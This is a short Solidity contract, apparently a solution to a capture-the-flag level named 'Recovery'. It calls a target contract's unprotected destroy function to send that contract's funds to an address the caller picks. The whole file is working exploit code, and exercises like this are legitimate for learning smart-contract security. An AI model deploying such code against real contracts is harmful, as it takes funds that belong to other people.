// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

    interface Recovery{
        function destroy(address payable _to) external;
    }

    contract RecoveryHack {

        Recovery public targetContract;

        constructor(address _targetContract){
            targetContract = Recovery(_targetContract);
        }

        function getTokens(address payable to) public {
            targetContract.destroy(to);
        }
    }